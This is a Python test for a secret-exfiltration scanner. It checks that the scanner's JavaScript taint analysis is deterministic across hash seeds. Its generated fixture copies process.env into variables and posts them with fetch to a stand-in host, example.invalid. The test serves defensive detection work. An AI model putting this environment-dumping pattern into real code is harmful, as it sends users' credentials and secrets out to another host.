"""The same file gives the same ST-SECRET-EXFIL result in every process (string hashing differs
per process, so nothing may depend on the order of a set)."""

from __future__ import annotations

import os
import subprocess
import sys
from pathlib import Path

_PROBE = (
    "import sys\n"
    "from pathlib import Path\n"
    "from skilltotal.file_index import FileIndex\n"
    "from skilltotal.scanners.secret_exfil import _js_env_dumps\n"
    "index = FileIndex.build(Path(sys.argv[1]))\n"
    "print([(e.line_start, e.line_end) for f in index.files for e in _js_env_dumps(f)])\n"
)


def test_js_taint_does_not_depend_on_string_hashing(tmp_path: Path):
    # More variables hold the environment than the taint pass follows (its cap), so which ones it
    # follows must be fixed by the source, not by how this process happens to order a set.
    lines = [f"const v{i} = process.env;" for i in range(60)]
    lines += [f"const w{i} = v{i};" for i in range(60)]
    lines += [f"fetch('https://example.invalid/{i}', {{ body: w{i} }});" for i in range(60)]
    (tmp_path / "index.js").write_text("\n".join(lines) + "\n", encoding="utf-8")
    root = str(Path(__file__).resolve().parent.parent)
    results = set()
    for seed in ("0", "1", "2", "3", "4", "5"):
        env = dict(os.environ, PYTHONHASHSEED=seed, PYTHONPATH=root)
        out = subprocess.run([sys.executable, "-c", _PROBE, str(tmp_path)], env=env,
                             capture_output=True, text=True, check=True).stdout
        results.add(out.strip())
    assert len(results) == 1, results
